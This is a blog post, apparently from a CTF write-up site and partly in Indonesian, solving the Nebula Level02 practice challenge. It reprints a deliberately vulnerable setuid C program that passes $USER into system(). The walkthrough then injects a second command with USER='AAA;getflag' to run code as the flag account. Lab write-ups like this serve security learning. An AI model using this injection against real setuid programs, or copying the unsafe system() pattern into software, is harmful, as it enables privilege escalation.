<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Exploit-Exercises Nebula - Level02</title>
  <meta name="description" content="Executive SummaryChallenge level02 exploit-exercise adalah mengganti value Environtment variable $USER sehingga dapat memanipulasi cara kerja program">
  
  <meta name="author" content="rhama">
  <meta name="copyright" content="&copy; rhama 2017">
  

  <!-- External libraries -->
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">

  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
  <link rel="manifest" href="/assets/icons/manifest.json">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">

  
  <!-- Facebook OGP cards -->
<!--   <meta property="og:description" content="Executive SummaryChallenge level02 exploit-exercise adalah mengganti value Environtment variable $USER sehingga dapat memanipulasi cara kerja program" />
  <meta property="og:url" content="https://rhama.my.id" />
  <meta property="og:site_name" content="CTF.Ninja" />
  <meta property="og:title" content="Exploit-Exercises Nebula - Level02" />
  <meta property="og:type" content="website" />
  <meta property="og:image" content="https://rhama.my.id/assets/images/ctf.png" />
  <meta property="og:image:type" content="image/png" />
  <meta property="og:image:width" content="612" />
  <meta property="og:image:height" content="605" /> -->
<meta content="https://rhama.my.id/assets/images/ctf.png" property="og:image" />
<meta content="CTF.Ninja" property="og:site_name" />
<meta content="object" property="og:type" />
<meta content="Exploit-Exercises Nebula - Level02" property="og:title" />
<meta content="https://rhama.my.id/ctf/2017/01/06/exploit-exercises-nebula-level02.html" property="og:url" />
<meta content="Executive SummaryChallenge level02 exploit-exercise adalah mengganti value Environtment variable $USER sehingga dapat memanipulasi cara kerja program" property="og:description" />

  

  

  

  <!-- Site styles -->
  <link rel="stylesheet" href="/css/main.css">
   <link rel="stylesheet" href="/css/terminal.css">
  <link rel="canonical" href="https://rhama.my.id/ctf/2017/01/06/exploit-exercises-nebula-level02.html">
  <link rel="alternate" type="application/rss+xml" title="CTF.Ninja" href="https://rhama.my.id/feed.xml" />
</head>


  <body>

    <header class="navigation" role="banner">
  <div class="navigation-wrapper">
    <a href="/" class="logo">
      
      <img src="/assets/logo.png" alt="CTF.Ninja">
      
    </a>
    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
      <i class="fa fa-bars"></i>
    </a>
    <nav role="navigation">
      <ul id="js-navigation-menu" class="navigation-menu show">
        
          
          <li class="nav-link"><a href="/about/">About</a>
          
        
          
          <li class="nav-link"><a href="/posts/">Archives</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </nav>
  </div>
</header>


    <div class="page-content">
        <div class="post">

<div class="post-header-container has-cover" style="background-image: url(/assets/images/ctf.png);">
  <div class="scrim has-cover">
    <header class="post-header">
      <h1 class="title">Exploit-Exercises Nebula - Level02</h1>
      <p class="info">by <strong>Aiden Pearce</strong></p>
    </header>
  </div>
</div>

<div class="wrapper">



<section class="post-meta">
  <div class="post-date">January 6, 2017</div>
  <div class="post-categories">
  in 
    
    <a href="/category/CTF">Ctf</a>
    
  
  </div>
</section>

<article class="post-content">
  <h1 id="executive-summary">Executive Summary</h1>
<p>Challenge level02 exploit-exercise adalah mengganti value Environtment variable $USER sehingga dapat memanipulasi cara kerja program</p>

<h1 id="about">About</h1>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>

<h1 id="source-code">Source code</h1>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>

  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>

  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>

  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>

  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"/bin/echo %s is cool"</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"USER"</span><span class="p">));</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"about to call system(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
  
  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<h1 id="proof-of-concept">Proof Of Concept</h1>
<p>Pada source code .c diatas terdapat fungsi asprintf untuk melakukan <em>Concatenating strings</em> dengan mengambil value dari $USER yang dipanggil oleh fungsi getenv()</p>

<p>Untuk menyelesaikan challenge ini, kita dapat mengganti value dari $USER sehingga dapat menjalankan command yang kita inginkan.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">sh</span><span class="o">-</span><span class="mf">4.2</span><span class="err">$</span> <span class="n">USER</span><span class="o">=</span><span class="s">"AAA;getflag"</span>
<span class="n">sh</span><span class="o">-</span><span class="mf">4.2</span><span class="err">$</span> <span class="o">./</span><span class="n">flag02</span>
<span class="n">about</span> <span class="n">to</span> <span class="n">call</span> <span class="n">system</span><span class="p">(</span><span class="s">"/bin/echo AAA;getflag is cool"</span><span class="p">)</span>
<span class="n">AAA</span>
<span class="n">You</span> <span class="n">have</span> <span class="n">successfully</span> <span class="n">executed</span> <span class="n">getflag</span> <span class="n">on</span> <span class="n">a</span> <span class="n">target</span> <span class="n">account</span></code></pre></figure>


</article>



<section class="tags">
  <strong>Tags:</strong> <a href="/tag/exploit-exercises.com">exploit-exercises.com</a>,&nbsp;<a href="/tag/CTF">CTF</a>
</section>



<section class="rss">
  <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
</section>

<section class="share">
  <span>Share: </span>
  
    
    
    
      <a href="//www.facebook.com/sharer.php?t=Exploit-Exercises+Nebula+-+Level02&u=https%3A%2F%2Frhama.my.id%2Fctf%2F2017%2F01%2F06%2Fexploit-exercises-nebula-level02.html"
        onclick="window.open(this.href, 'facebook-share', 'width=550,height=255');return false;">
        <i class="fa fa-facebook-square fa-lg"></i>
      </a>
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
    
  
    
    
    
    
    
    
    
      <a href="//www.reddit.com/submit" onclick="window.location = '//www.reddit.com/submit?url=' + encodeURIComponent('https://rhama.my.id/ctf/2017/01/06/exploit-exercises-nebula-level02.html') + '&title=Exploit-Exercises Nebula - Level02'; return false">
        <i class="fa fa-reddit-square fa-lg"></i>
      </a>
    
    
  
    
    
    
    
    
    
    
    
  
</section>




</div>
</div>

    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <h3 class="footer-heading">CTF.Ninja</h3>

    <div class="site-navigation">

      <p><strong>Site Map</strong></p>
      <ul class="pages">
        
        
          <li class="nav-link"><a href="/about/">About</a>
        
        
        
          <li class="nav-link"><a href="/posts/">Archives</a>
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
        
      </ul>
    </div>

    <div class="site-contact">

      <p><strong>Contact</strong></p>
      <ul class="social-media-list">
        <li>
          <a href="mailto:r4m@protonmail.com">
            <i class="fa fa-envelope-o"></i>
            <span class="username">r4m@protonmail.com</span>
          </a>
        </li>

        
          
          <li>
            <a href="https://www.facebook.com/eat.sleep.pwn.repeat" title="Friend me on Facebook">
              <i class="fa fa-facebook"></i>
              <span class="username">eat.sleep.pwn.repeat</span>
            </a>
          </li>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        

      </ul>
    </div>

    <div class="site-signature">
      <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
      <p class="text">CTF, InfoSec, Banana And More.
</p>
    </div>

  </div>

</footer>

<!-- Scripts -->
<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>

<script type="text/javascript">
$(document).ready(function() {
  // Default syntax highlighting
  hljs.initHighlightingOnLoad();

  // Header
  var menuToggle = $('#js-mobile-menu').unbind();
  $('#js-navigation-menu').removeClass("show");
  menuToggle.on('click', function(e) {
    e.preventDefault();
    $('#js-navigation-menu').slideToggle(function(){
      if($('#js-navigation-menu').is(':hidden')) {
        $('#js-navigation-menu').removeAttr('style');
      }
    });
  });
});

</script>






  </body>

</html>
